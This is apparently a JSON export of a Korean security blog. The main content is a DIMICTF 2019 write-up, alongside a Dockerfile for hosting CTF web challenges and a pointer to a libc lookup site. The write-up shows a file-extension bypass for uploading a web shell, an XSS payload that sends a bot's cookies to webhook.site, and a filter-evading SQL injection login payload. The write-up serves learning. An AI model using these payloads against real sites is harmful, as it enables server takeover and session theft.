{"meta":{"title":"JHYEON BLOG","subtitle":"Web Development & Security Research","description":"정동현(JHYEON BLOG)","author":"jhyeon","url":"https://blog.jhyeon.dev","root":"/"},"pages":[{"title":"All Category","date":"2021-01-17T07:38:25.000Z","updated":"2021-01-17T07:39:42.206Z","comments":true,"path":"categories/index.html","permalink":"https://blog.jhyeon.dev/categories/index.html","excerpt":"","text":""},{"title":"All Tags","date":"2021-01-17T07:38:15.000Z","updated":"2021-01-17T07:39:23.265Z","comments":true,"path":"tags/index.html","permalink":"https://blog.jhyeon.dev/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"DIMICTF 2019 Write up","slug":"dimictf-200206","date":"2020-02-05T15:00:00.000Z","updated":"2021-01-17T08:07:13.718Z","comments":true,"path":"2020/02/06/dimictf-200206/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/06/dimictf-200206/","excerpt":"","text":"1. web(5shared)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phprequire_once &#x27;lib.php&#x27;;session_start();$session = md5(session_id());$uploaddir = __DIR__ . &quot;/~uploads/&#123;$session&#125;/&quot;;createDirectory(__DIR__ . &quot;/~uploads/&quot;);createDirectory($uploaddir);//print_r($_FILES[&#x27;file&#x27;]);$file = $_FILES[&#x27;file&#x27;];$uploadfile = $uploaddir . $file[&#x27;name&#x27;];// sanity check$extension = explode(&#x27;.&#x27;, $file[&#x27;name&#x27;])[1];if (!in_array($extension, Array(&quot;jpg&quot;, &quot;gif&quot;, &quot;png&quot;)))&#123; $message = &quot;&lt;script&gt;alert(&#x27;jpg, gif, png 확장자만 업로드할 수 있습니다.&#x27;); history.back(); &lt;/script&gt;&quot;; die($message);&#125;// the real sanity check$real_extension = array_pop(explode(&#x27;.&#x27;, $file[&#x27;name&#x27;]));if (preg_match(&quot;/php/i&quot;, $file[&#x27;name&#x27;]))&#123; $message = &quot;&lt;script&gt;alert(&#x27;파일 이름에 php가 들어가면 안됩니다.&#x27;); history.back(); &lt;/script&gt;&quot;; die($message);&#125;if ($file[&#x27;size&#x27;] &gt; 4096)&#123; $message = &quot;&lt;script&gt;alert(&#x27;최대 4mb까지 업로드할 수 있습니다.&#x27;); history.back(); &lt;/script&gt;&quot;; die($message);&#125;if (move_uploaded_file($file[&#x27;tmp_name&#x27;], $uploadfile))&#123; $message = &quot;&lt;script&gt;alert(&#x27;성공적으로 파일이 업로드되었습니다.&#x27;); location.href = &#x27;/&#x27;; &lt;/script&gt;&quot;; echo $message;&#125;else&#123; $message = &quot;&lt;script&gt;alert(&#x27;업로드 에러&#x27;); history.back(); &lt;/script&gt;&quot;; echo $message;&#125; 코드가 좀 긴편인데 주요 부분들만 한번 확인 해보자, 123456789101112131415// sanity check$extension = explode(&#x27;.&#x27;, $file[&#x27;name&#x27;])[1];if (!in_array($extension, Array(&quot;jpg&quot;, &quot;gif&quot;, &quot;png&quot;)))&#123; $message = &quot;&lt;script&gt;alert(&#x27;jpg, gif, png 확장자만 업로드할 수 있습니다.&#x27;); history.back(); &lt;/script&gt;&quot;; die($message);&#125;// the real sanity check$real_extension = array_pop(explode(&#x27;.&#x27;, $file[&#x27;name&#x27;]));if (preg_match(&quot;/php/i&quot;, $file[&#x27;name&#x27;]))&#123; $message = &quot;&lt;script&gt;alert(&#x27;파일 이름에 php가 들어가면 안됩니다.&#x27;); history.back(); &lt;/script&gt;&quot;; die($message);&#125; 웹쉘 업로드 문제이기 때문에 사실상 이 부분만 우회할 수 있다면 금방 풀 수 있다. sanity check 부분에 보면 argv[1] 로 오는 문자를 검사하는데,jpg, gif, png 만 허용시켜 둔 상황이다. 그런데 php에선 또 이상한 문제점이 우리를 반겨준다. 저렇게 검사할 경우에 다음과 같은 트릭을 사용할 수 있다. test.jpg test.jpg.phpjpg 뒤에 확장자를 하나 더 붙여서 실행 파일로 만들어 주면 확장자 검사를 피할 수 있다.근데 아래 real sanity check를 보면 php는 또 불가능 하기 때문에 php 대체 확장자를 써서 우회해주자. (phtml, php5 등) upload) test.jpg.phtml위와 같이 파일 명을 바꾸고, 웹 쉘을 업로드 시키면 된다. 2. (web) simple xss문제에 들어가면 게시판이 있는데 그냥 글쓰기 부분에서 xss payload 넣고,봇의 쿠키를 탈취하면 된다. 1location.href=&#x27;https://webhook.site/~&#x27;+document.cookie; 3. (web) simple sqli1234567891011121314151617181920212223242526272829303132333435&lt;?php //error_reporting(E_ALL); //ini_set(&quot;display_errors&quot;, 1); require &#x27;lib.php&#x27;; if (isset($_GET[&#x27;view-source&#x27;]))&#123; highlight_file(__FILE__); exit; &#125; $id = $_POST[&#x27;id&#x27;]; $pw = $_POST[&#x27;pw&#x27;]; //var_dump($conn); if (preg_match(&quot;/information|admin|or|\\=| |\\#|\\&#x27;|_|where/i&quot;, $id . $pw)) die(&quot;No Hack ~_~&quot;); if (isset($id, $pw)) &#123; $query = &quot;SELECT * FROM `users` WHERE `id` = trim(&#x27;&#123;$id&#125;&#x27;) AND `pw` = trim(&#x27;&#123;$pw&#125;&#x27;)&quot;; $result = mysqli_fetch_array(mysqli_query($conn, $query)); if ($result[&#x27;id&#x27;] === &#x27;admin&#x27;) echo &quot;&lt;h1&gt;&#123;$flag&#125;&lt;/h1&gt;&quot;; if ($result[&#x27;id&#x27;]) &#123; $message = &quot;&#123;$result[&#x27;id&#x27;]&#125;님 안녕하세요!&quot;; &#125; else &#123; $message = &quot;로그인에 실패하였습니다. 다시 시도해주세요.&quot;; &#125; &#125; ?&gt; 페이지 로그인 코드는 다음과 같다.$id, $pw 에 입력되는 값에서 information, admin, or 등 여러가지를 필터링 한다. 이 정규식 검증 부분들은 tab, like 문자를 통해서 쿼리문을 완성할 수 있다. 1id=\\&amp;pw=)|| id like &quot;ad&quot; &quot;min&quot;-- -","categories":[],"tags":[{"name":"CTF, Web","slug":"CTF-Web","permalink":"https://blog.jhyeon.dev/tags/CTF-Web/"}]},{"title":"CTF Web Challenge(Dockerfile)","slug":"dockerfile-200205","date":"2020-02-04T15:00:00.000Z","updated":"2021-01-17T07:52:18.975Z","comments":true,"path":"2020/02/05/dockerfile-200205/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/05/dockerfile-200205/","excerpt":"","text":"간단한 버전이라서 쓰는 사람에 맞게 적절히 수정하면 된다. 12345678910111213141516FROM ubuntu:18.04ENV DEBIAN_FRONTEND=noninteractiveENV TERM=linuxRUN apt-get update -yRUN apt-get install apache2 -yRUN apt-get install libapache2-mod-php -yRUN apt-get install php -yRUN apt-get install vim -yCOPY ./files /var/www/htmlRUN rm -rf /var/www/html/index.htmlEXPOSE 포트번호CMD [&quot;/usr/sbin/apache2ctl&quot;, &quot;-D&quot;, &quot;FOREGROUND&quot;]","categories":[{"name":"Docker","slug":"Docker","permalink":"https://blog.jhyeon.dev/categories/Docker/"}],"tags":[{"name":"Dockerfile, Docker","slug":"Dockerfile-Docker","permalink":"https://blog.jhyeon.dev/tags/Dockerfile-Docker/"}]},{"title":"libc database search(bluekat)","slug":"pwnbluekat-200205","date":"2020-02-04T15:00:00.000Z","updated":"2021-01-17T08:08:00.797Z","comments":true,"path":"2020/02/05/pwnbluekat-200205/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/05/pwnbluekat-200205/","excerpt":"","text":"예전에 포너블 공부할 때 rop 문제에서 오프셋 기반으로립씨 버전 하나하나 찾으려니 솔직히 너무 귀찮았다.. 그래서 찾아보다가 libc bluekat 이라는 사이트를 찾았는데,함수 오프셋을 통해서 일치하는 libc 버전을 간단하게 찾아 주었다! 포너블 하신다면 자주 이용해먹으면 좋을 것 같다. [https://libc.blukat.me](libc-bluekat homepage)","categories":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/categories/Pwnable/"}],"tags":[{"name":"Tools","slug":"Tools","permalink":"https://blog.jhyeon.dev/tags/Tools/"}]}],"categories":[{"name":"Docker","slug":"Docker","permalink":"https://blog.jhyeon.dev/categories/Docker/"},{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/categories/Pwnable/"}],"tags":[{"name":"CTF, Web","slug":"CTF-Web","permalink":"https://blog.jhyeon.dev/tags/CTF-Web/"},{"name":"Dockerfile, Docker","slug":"Dockerfile-Docker","permalink":"https://blog.jhyeon.dev/tags/Dockerfile-Docker/"},{"name":"Tools","slug":"Tools","permalink":"https://blog.jhyeon.dev/tags/Tools/"}]}